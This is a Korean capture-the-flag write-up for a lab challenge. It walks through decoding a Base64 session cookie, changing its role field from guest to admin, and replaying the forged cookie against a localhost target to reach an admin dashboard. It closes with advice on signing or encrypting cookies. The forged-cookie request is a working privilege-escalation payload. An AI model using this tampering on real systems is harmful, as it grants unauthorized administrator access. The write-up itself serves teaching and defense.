+++
title = "VulnABLE CTF [LUXORA] Write-up: Weak Crypto 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Crypto", "Bronze", "Base64", "Encoding", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Weak Crypto 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Weak Cryptography)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/crypto/bronze`
- **목표**: 서버가 데이터를 보호하기 위해 '암호화(Encryption)'라고 착각하고 사용한 '단순 인코딩(Encoding)' 방식을 식별하여 해독(Decode)하고, 값을 변조하여 관리자 권한을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/crypto/bronze` 경로에 접속하여 `user` 계정으로 로그인합니다.
발급된 세션 쿠키를 확인해 봅니다.

**[정상 로그인 쿠키]**
```http
Set-Cookie: user_data=eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiZ3Vlc3QifQ==
```

**[해커의 사고 과정]**
1. 쿠키 값이 길고 끝에 `==` (패딩)가 붙어 있다.
2. 영문 대소문자와 숫자로만 이루어진 이 형태는 십중팔구 **Base64 인코딩**이다.
3. 인코딩은 데이터를 암호화(보호)하는 것이 아니라, 통신을 위해 문자열의 형태만 바꾸는 것이다. 누구나 디코딩할 수 있다.
4. 내용을 열어보고 내 마음대로 수정한 뒤 다시 묶어보자!

---

## 💥 2. 취약점 식별 및 데이터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ]
|-- Intercepts Ciphertext/Token
|-- Analyzes Pattern (ECB Block, Base64, etc.)
|-- Cuts/Pastes/Decodes/Spoofs
|-- Sends Forged Token --> [ Web Server ]
                           |-- Accepts Forged Token
```


이 문제는 "인코딩(Encoding)은 암호화(Encryption)가 아니다"라는 가장 기본적인 보안 상식을 테스트하는 문제입니다.

### 💡 데이터 디코딩 (Decoding)
리눅스 터미널이나 CyberChef 같은 도구를 이용해 쿠키 값을 디코딩합니다.

```bash
$ echo "eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiZ3Vlc3QifQ==" | base64 -d
{"username":"user","role":"guest"}
```
JSON 형태의 평문 데이터가 그대로 노출되었습니다.

### 💡 권한 상승(Privilege Escalation)을 위한 재인코딩
`role`을 `guest`에서 `admin`으로 변경한 JSON 문자열을 다시 Base64로 인코딩합니다.

**[조작할 문자열]**
```json
{"username":"user","role":"admin"}
```

**[재인코딩 (Encoding)]**
```bash
$ echo -n '{"username":"user","role":"admin"}' | base64
eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ==
```
*(참고: `echo -n` 을 써야 불필요한 줄바꿈 문자가 들어가서 데이터가 깨지는 것을 막을 수 있습니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 쿠키를 사용하여 관리자 대시보드 접근을 시도합니다.

**[페이로드 전송]**
```http
GET /crypto/bronze/dashboard HTTP/1.1
Host: localhost:3000
Cookie: user_data=eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ==
```

### 🔍 서버의 응답
서버는 쿠키를 가져와 자신이 만든 Base64 방식대로 디코딩합니다. 그리고 `role`이 `admin`인 것을 확인하고 통과시킵니다. 데이터 무결성을 보장하는 암호학적 서명(Signature)이 없기 때문에 완벽히 속아 넘어갑니다.

```html
HTTP/1.1 200 OK

<div class="admin-dashboard">
  <h2>Welcome to the Admin Dashboard</h2>
  <p>Status: Unlocked</p>
  <p class="flag">FLAG{CRYPTO_🥉_BASE64_IS_NOT_ENCRYPTION_C4D5E6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

Base64, Hex, URL 인코딩 등은 데이터를 보호하는 수단이 될 수 없으며, 서명 없는 클라이언트 데이터는 언제든 해커에게 100% 조작된다는 사실을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{CRYPTO_🥉_BASE64_IS_NOT_ENCRYPTION_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
클라이언트로 보내는 민감한 데이터에 무결성(Integrity) 검증 로직이 누락된 것이 원인입니다.

* **안전한 패치 가이드 (서명 또는 암호화)**
데이터를 클라이언트에 저장해야 한다면 두 가지 방법이 있습니다.

1. **무결성 보장 (서명된 쿠키 / JWT)**:
   데이터를 숨길 필요는 없지만 조작은 막고 싶다면, `HMAC-SHA256` 같은 서명을 붙인 JWT(JSON Web Token)나 Signed Cookie를 사용해야 합니다.
   ```javascript
   // Express.js 의 cookie-parser 서명 옵션 사용
   res.cookie('user_data', JSON.stringify(userData), { signed: true });
   ```
2. **기밀성 보장 (암호화)**:
   데이터 내용 자체를 숨겨야 한다면, 강력한 양방향 암호화 알고리즘(예: `AES-256-GCM`)을 사용하여 데이터를 암호화한 뒤 넘겨야 합니다. (이때 암호화 키는 서버만이 안전하게 보관해야 합니다.)